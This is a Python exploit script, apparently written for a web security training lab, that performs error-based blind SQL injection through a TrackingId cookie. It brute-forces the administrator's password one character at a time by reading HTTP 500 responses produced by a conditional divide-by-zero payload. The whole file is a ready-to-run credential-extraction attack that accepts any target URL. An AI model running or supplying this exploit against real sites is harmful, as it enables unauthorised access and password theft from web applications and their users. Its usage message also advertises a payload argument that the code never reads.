import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }


def sqli_password(url):
    pwd = ""
    for i in range(1,21):
        for j in range(32,126):
            payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            encoded_payload = urllib.parse.quote(payload)
            cookies = {"TrackingId":"RqNwPFMUYaI8FWHM" + encoded_payload,"session":"REYaeEK6kuQzRH1npbzYNMPlrQtX33Yp" }
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                pwd += chr(j)
                sys.stdout.write('\r' + pwd)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + pwd + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:  
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    url = sys.argv[1]
    print("[*] Retrieving Password")
    sqli_password(url)

if __name__ == "__main__":
    main()